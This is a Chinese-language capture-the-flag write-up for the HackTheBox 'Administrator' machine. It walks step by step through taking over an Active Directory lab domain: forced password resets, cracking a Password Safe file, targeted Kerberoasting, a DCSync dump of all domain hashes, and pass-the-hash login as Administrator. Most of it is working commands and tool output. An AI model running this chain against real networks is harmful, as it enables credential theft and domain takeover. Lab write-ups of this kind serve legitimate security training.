---
title: '[htb] Administrator'
date: 2024-11-29 17:24 +0800
categories: [hack,HackTheBox]
tags: [windows]
---

# information

```shell
╭─bamuwe@Mac ~/Documents
╰─$ nmap -sVC 10.10.11.42
Starting Nmap 7.95 ( https://nmap.org ) at 2024-11-29 18:50 CST
Nmap scan report for 10.10.11.42
Host is up (0.13s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-29 17:39:16Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-11-29T17:39:29
|_  start_date: N/A
|_clock-skew: 6h46m16s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 192.74 seconds
```
![alt text](<../assets/img/2024-11-29-[htb] Administrator/image.png>)
> 官网提供了user1的账号密码


# user1

- **user1：Olivia/ichliebedich**

使用user1账号密码登录
```shell
╭─bamuwe@Mac ~/Documents
╰─$ evil-winrm -i administrator.htb -u 'Olivia' -p 'ichliebedich'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents>
```
使用`Bloodhood`收集域内信息：
```shell
╭─bamuwe@Mac ~/Desktop
╰─$ bloodhound-python -d administrator.htb -ns 10.10.11.42    -u olivia -p ichliebedich -c All --zip
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno 8] nodename nor servname provided, or not known
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 27S
INFO: Compressing output into 20241129200107_bloodhound.zip
```
![alt text](<../assets/img/2024-11-29-[htb] Administrator/image-1.png>)
> bloodhood截图

我们以Oliver用户为起始点，发现该用户对于michael用户拥有`Genericall`。
使用oliver用户修改michael用户的密码：

```shell
*Evil-WinRM* PS C:\Users\olivia\Documents> net user michael michael /domain
The command completed successfully.
```

# user2
- **user2:michael/michael**

![image-20241129203619487](../assets/img/2024-11-29-%5Bhtb%5D%20Administrator/image-20241129203619487.png)


> booldhood截图

michael用户对benjamin用户拥有ForceChangePasswd的权限。

```shell
╭─bamuwe@Mac ~/Desktop
╰─$ rpcclient -U michael 10.10.11.42
Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
Password for [WORKGROUP\michael]:
rpcclient $> id
command not found: id
rpcclient $> setuserinfo2 benjamin benjamin
Usage: setuserinfo2 username level password [password_expired]
result was NT_STATUS_INVALID_PARAMETER
rpcclient $> setuserinfo2 benjamin 23 benjamin
rpcclient $>
```

# user3

**user3:benjamin/benjamin**

```shell
╭─bamuwe@Mac ~/Documents
╰─$ crackmapexec smb 10.10.11.42 -u 'benjamin' -p 'benjamin'
SMB         10.10.11.42     445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\benjamin:benjamin
```

benjaming用户没有其他特权。

![image-20241129205149620](../assets/img/2024-11-29-%5Bhtb%5D%20Administrator/image-20241129205149620.png)

> bloodhood截图

尝试从隶属组share入手。

```shell
╭─bamuwe@Mac ~/Documents 
╰─$ ftp 10.10.11.42
Connected to 10.10.11.42.
220 Microsoft FTP Service
Name (10.10.11.42:root): benjamin
331 Password required
Password:
230 User logged in.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 3 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
952 bytes received in 0.153 seconds (6.08 kbytes/s)
```

得到一个Backup.psafe3文件，使用strongbox打开，存在密码。

```shell
╭─bamuwe@Mac ~/Desktop
╰─$ hashcat -m 5200 Backup.psafe3 ~/Documents/rockyou.txt
hashcat (v6.2.6) starting

* Device #2: Apple's OpenCL drivers (GPU) are known to be unreliable.
             You have been warned.

METAL API (Metal 367.4)
=======================
* Device #1: Apple M1, 2688/5461 MB, 8MCU

OpenCL API (OpenCL 1.2 (Sep 28 2024 20:23:41)) - Platform #1 [Apple]
====================================================================
* Device #2: Apple M1, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

ATTENTION! Potfile storage is disabled for this hash mode.
Passwords cracked during this session will NOT be stored to the potfile.
Consider using -o to save cracked passwords.

Watchdog: Temperature abort trigger set to 100c

Host memory required for this attack: 281 MB

Dictionary cache hit:
* Filename..: /Users/bamuwe/Documents/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

Backup.psafe3:tekieromucho

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5200 (Password Safe v3)
Hash.Target......: Backup.psafe3
Time.Started.....: Fri Nov 29 21:07:41 2024 (1 sec)
Time.Estimated...: Fri Nov 29 21:07:42 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/Users/bamuwe/Documents/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   192.1 kH/s (9.50ms) @ Accel:256 Loops:64 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 65536/14344384 (0.46%)
Rejected.........: 0/65536 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2048-2049
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> ryanscott
Hardware.Mon.SMC.: Fan0: 0%
Hardware.Mon.#1..: Util: 83%

Started: Fri Nov 29 21:07:31 2024
Stopped: Fri Nov 29 21:07:42 2024
```

**获得密码tekieromucho**

![image-20241129211357559](../assets/img/2024-11-29-%5Bhtb%5D%20Administrator/image-20241129211357559.png)

> strongbox截图

一下子得到了三个用户的账号密码。

# user4

- **user:emily/UXLCI5iETUsIBoFVTj8yQFKoHjXmb**

```shell
╭─bamuwe@Mac ~/Desktop
╰─$ crackmapexec smb 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
SMB         10.10.11.42     445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

![image-20241129212045153](../assets/img/2024-11-29-%5Bhtb%5D%20Administrator/image-20241129212045153.png)

> Bloodhound截图

GenericWrite：拥有该权限，可以修改目标安全对象的所有参数，包括对所有属性的修改。

这一步应该要先利用emily用户让ethan用户注册spn，再请求票据，但是公共靶机，有人把前面一步做了。后人乘凉了。

使用targetedKerberoast尝试获得Kerberos

```shell
╭─bamuwe@Mac ~/Documents
╰─$ targetedKerberoast  -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$ec685848b91c83f51846ac50fc4d5ca9$571301ac6b7088201675a167d29065465f9c1c9995ec6a9fd68fe93cde1e130f409bc239bf788a1d4da6134527155bf27b4810a57e8dee9d6a9035dc0dca6771afccad9410fe26e4363633b5e3bc84efc97e59654c991d740c848c30c8f0dd26b6ee874c4de6371a842dc58adc3af9cc9f6870474a18ad0b370d6a0462c873dea1ce9267a8ac18a32cfd6d7c9872028aa4047187100f1d64863c0cf941c2bfc2a1b61bbc10ab5249df62fd5b4596c8f78f02fc86e7235331c44037c97489a1cac07844be1a4c87b61e4021a88022a1d87372e20265ff899e2cd21f2bf5f92cfdb4e93e6fd02a1241c676bf1c350a15214137094ffe30406122fe84f9d291b0a8b4dd54de9578bfbd8934a6c4d25d476483147c85f8572fc14604989b836a7436645a2a51de5ce69df14059dd2c00f4ba8639b5d68e7cedd3c0cd333078d9ff61ac44e98da204b7bcfce83a31569fa11b5bc5a1379fa4f282792d6cdb6a6261d2400c8ad740de2213b786fec1f40830441785834e1afc3dc8e526dda244d86243a63f748c5b86e3b80c8ea739e52533be1506d7eae5f1c2c094898b4f01d8be3bd50c20e87f5e5f7d0146b3e05157c9c987d784a421dd21bb9233319a3861144bfc2b936c3742ab9848736b6ee49d48e71af4aaa832d0fc6a50d14ab3c7507de126c99851e64b9c4715f6b004b9b810575949bc85e54c97dacb05e835a98c84c5ff005038604c2f401ce2b4c26924d96fdd94a6d0d6cca1a0e88fd03163ab1cff3ed50eb885143f32266721b6ce3683a2c7157a243ba3b285fd4fa2273f3a2a06ec08e607b715f00ad83191d5c50f332818f3f05f4360d014624cb438d3cee1e6302de71d0cea1f13b073a4551bd6f6514313a641dd651298bf7cd35da87d8f484ba1360f47eb038e0d08402ae0dbf686594a9195a3fed4ea73dde3401e36d8df8e6ec33395bac4a04bdaa17f9666b1914c3181dacb94ff12721d504f7d6ed7384fae99c6b35cf23565434807fce1c3e7f15649489a0d51874a2b1c8ca073fd15fb888d9e2cd7da931db27099654c60964f79be4b6bfea20ac90662334f17e98d6cc43eb1d249043b9e6c0affeba2ba145934a3d16bc118cc94895a4fe6f0753c006d3442de88e80ef4f3a59098052ff2ca7c020d63568cb671b3a09b95b3bbf2aedcf79e6b99d7c1e4f3df532666ad4cf115d7bb5e984ff4c14aa1dc173e6309ac76f61ba2d020980c792ebb30bbe8b9e826ebc11be1140abb4ec467cee8c90d68958ba49c4134fdeef5c4ebe88287fa5c30dff5563533b24101703f8313181dc8e2152a68aab81822f8352c5cea9975b05c37b7e5504ea4cc5ef10a1dcb3962d6c04ba0e0745e9f75eb29f64b640a6bba9e70c3516f9eff981ed95408f0efb2f741d78a20415a74931f8f4eb11e8ddcb1b1b3287acf337bc4cdefcc506a90007b493445016cc116753581f6ea8fc77fd17f19d7a7dfbb27b10e7515ce1038b79e8948e5509b6f006340389d251b31ddefa79900073bd7f011123055bfdc17
```

使用hashcat破解该凭据：

```shell

╭─bamuwe@Mac ~/Desktop
╰─$ hashcat kr5 ~/Documents/rockyou.txt                                                                                                                                 255 ↵
hashcat (v6.2.6) starting in autodetect mode

* Device #2: Apple's OpenCL drivers (GPU) are known to be unreliable.
             You have been warned.

METAL API (Metal 367.4)
=======================
* Device #1: Apple M1, 2688/5461 MB, 8MCU

OpenCL API (OpenCL 1.2 (Sep 28 2024 20:23:41)) - Platform #1 [Apple]
====================================================================
* Device #2: Apple M1, skipped

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 100c

Host memory required for this attack: 70 MB

Dictionary cache hit:
* Filename..: /Users/bamuwe/Documents/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$ec685848b91c83f51846ac50fc4d5ca9$571301ac6b7088201675a167d29065465f9c1c9995ec6a9fd68fe93cde1e130f409bc239bf788a1d4da6134527155bf27b4810a57e8dee9d6a9035dc0dca6771afccad9410fe26e4363633b5e3bc84efc97e59654c991d740c848c30c8f0dd26b6ee874c4de6371a842dc58adc3af9cc9f6870474a18ad0b370d6a0462c873dea1ce9267a8ac18a32cfd6d7c9872028aa4047187100f1d64863c0cf941c2bfc2a1b61bbc10ab5249df62fd5b4596c8f78f02fc86e7235331c44037c97489a1cac07844be1a4c87b61e4021a88022a1d87372e20265ff899e2cd21f2bf5f92cfdb4e93e6fd02a1241c676bf1c350a15214137094ffe30406122fe84f9d291b0a8b4dd54de9578bfbd8934a6c4d25d476483147c85f8572fc14604989b836a7436645a2a51de5ce69df14059dd2c00f4ba8639b5d68e7cedd3c0cd333078d9ff61ac44e98da204b7bcfce83a31569fa11b5bc5a1379fa4f282792d6cdb6a6261d2400c8ad740de2213b786fec1f40830441785834e1afc3dc8e526dda244d86243a63f748c5b86e3b80c8ea739e52533be1506d7eae5f1c2c094898b4f01d8be3bd50c20e87f5e5f7d0146b3e05157c9c987d784a421dd21bb9233319a3861144bfc2b936c3742ab9848736b6ee49d48e71af4aaa832d0fc6a50d14ab3c7507de126c99851e64b9c4715f6b004b9b810575949bc85e54c97dacb05e835a98c84c5ff005038604c2f401ce2b4c26924d96fdd94a6d0d6cca1a0e88fd03163ab1cff3ed50eb885143f32266721b6ce3683a2c7157a243ba3b285fd4fa2273f3a2a06ec08e607b715f00ad83191d5c50f332818f3f05f4360d014624cb438d3cee1e6302de71d0cea1f13b073a4551bd6f6514313a641dd651298bf7cd35da87d8f484ba1360f47eb038e0d08402ae0dbf686594a9195a3fed4ea73dde3401e36d8df8e6ec33395bac4a04bdaa17f9666b1914c3181dacb94ff12721d504f7d6ed7384fae99c6b35cf23565434807fce1c3e7f15649489a0d51874a2b1c8ca073fd15fb888d9e2cd7da931db27099654c60964f79be4b6bfea20ac90662334f17e98d6cc43eb1d249043b9e6c0affeba2ba145934a3d16bc118cc94895a4fe6f0753c006d3442de88e80ef4f3a59098052ff2ca7c020d63568cb671b3a09b95b3bbf2aedcf79e6b99d7c1e4f3df532666ad4cf115d7bb5e984ff4c14aa1dc173e6309ac76f61ba2d020980c792ebb30bbe8b9e826ebc11be1140abb4ec467cee8c90d68958ba49c4134fdeef5c4ebe88287fa5c30dff5563533b24101703f8313181dc8e2152a68aab81822f8352c5cea9975b05c37b7e5504ea4cc5ef10a1dcb3962d6c04ba0e0745e9f75eb29f64b640a6bba9e70c3516f9eff981ed95408f0efb2f741d78a20415a74931f8f4eb11e8ddcb1b1b3287acf337bc4cdefcc506a90007b493445016cc116753581f6ea8fc77fd17f19d7a7dfbb27b10e7515ce1038b79e8948e5509b6f006340389d251b31ddefa79900073bd7f011123055bfdc17:limpbizkit

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....bfdc17
Time.Started.....: Fri Nov 29 22:18:29 2024 (0 secs)
Time.Estimated...: Fri Nov 29 22:18:29 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/Users/bamuwe/Documents/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  5877.0 kH/s (10.53ms) @ Accel:384 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 98304/14344384 (0.69%)
Rejected.........: 0/98304 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> Dominic1
Hardware.Mon.SMC.: Fan0: 0%
Hardware.Mon.#1..: Util: 34%

Started: Fri Nov 29 22:18:19 2024
Stopped: Fri Nov 29 22:18:31 2024
```

# user5

- **user5:ethan/limpbizkit**

查看ethan用户的特权：

![image-20241130051543041](../assets/img/2024-11-29-%5Bhtb%5D%20Administrator/image-20241130051543041.png)

> Bloodhood截图

DCSync攻击特权：是指攻击者拥有复制 Active Directory 数据的权限，从而能够请求并获取用户密码哈希和Kerberos密钥。

使用secretsdump获取密码。

```shell

╭─bamuwe@Mac ~/Desktop
╰─$ secretsdump.py administrator.htb/ethan:limpbizkit@10.10.11.42
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:bb53a477af18526ada697ce2e51f76b3:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:5a67836f41cbf81bb895e038f24736d014b1a8e21b7a02d0f27311ea5165d182
administrator.htb\michael:aes128-cts-hmac-sha1-96:45f26e505610edfeb639d69babdc88d7
administrator.htb\michael:des-cbc-md5:1c08c867201a02f8
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:debcfa9696a54eecc68ec3059bd1e382adf8056d3d373b5636817cde36d340e7
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:e07a6bebd5577429690961f33f0d537a
administrator.htb\benjamin:des-cbc-md5:cdc454c4adab5452
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up... 
```

获得administrator的hash凭据。

# system

```shell
╭─bamuwe@Mac ~/Desktop
╰─$ evil-winrm -i administrator.htb -u 'administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

# conclusion

- Windows 靶机还是挺有意思的，但是需要对ad的运作方式有更多的了解。
